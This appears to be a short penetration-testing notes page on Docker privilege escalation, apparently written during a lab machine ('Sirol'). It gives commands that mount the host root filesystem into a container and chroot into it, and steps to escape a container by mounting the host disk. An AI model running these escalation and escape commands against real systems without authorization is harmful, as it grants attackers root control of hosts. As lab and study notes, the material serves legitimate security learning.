# Docker

{% embed url="https://github.com/tranquac/Linux-Privilege-Escalation#docker" %}

{% embed url="https://gtfobins.github.io/gtfobins/docker/" %}

{% embed url="https://flast101.github.io/docker-privesc/" %}

### Enumerate images and processes

```
docker ps 
docker images
```

Based on the running images we can now attempt to elevate privileges through them.

```
docker run -v /:/mnt --rm -it <imagees> chroot /mnt sh
```

### Breaking Out of Docker Env

Lets say for whatever reason Fabian, you seem to list and things aren't where they are supposed to be and if you run `ls -la` Youll notice that something doesnt seem right.

![](../../../.gitbook/assets/2022-08-10\_16-24.png)

In the case of Sirol we were root in a docker environment.&#x20;

In order to break out we must first list the disks in the computer and then mount one to our own and we will be able to navigate to the filesystem.

`fdisk -l`

![](<../../../.gitbook/assets/image (52).png>)

This command as seen above lists the disk names and their paths. In order to break out we shall ran the following commands.&#x20;

```
mkdir /mnt/own
mount ##THIS CAN BE CHANGED/dev/sda1 ####/mnt/own
cd /mnt/own
```

Notice that in the code we gotta change accordingly which the lists of disks that are in the machine.

Once we execute those commadns we will have full control of the filesystem.

![](<../../../.gitbook/assets/image (73).png>)
